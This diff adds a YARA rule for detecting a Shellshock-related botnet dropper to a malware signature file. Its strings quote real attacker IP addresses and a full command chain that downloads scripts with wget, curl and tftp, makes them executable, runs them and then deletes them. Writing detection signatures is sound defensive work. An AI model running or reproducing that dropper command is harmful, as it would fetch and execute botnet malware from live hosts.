@@ -87,3 +87,21 @@ rule Mirai_DemonBot
   condition:
     ($cc and $file_str) or any of ($str*)
 }
+
+rule Shellshock {
+  meta:
+    author = "Nong Hoang Tu"
+    email = "dmknght@parrotsec.org"
+    description = "Shellshock.A"
+    reference = "https://otx.alienvault.com/indicator/file/88ab21215c71fe88b04ab7b0e6a882a65c25df5aed79232f495f4bdb4c9a3600"
+    date = "12/11/2021"
+    target = "File, memory"
+  strings:
+    $addr_1 = "http://195.58.39.37/bins.sh"
+    $addr_2 = "185.172.110.209"
+    $addr_3 = "195.58.39.37"
+    $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
+    $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
+  condition:
+    any of them
+}
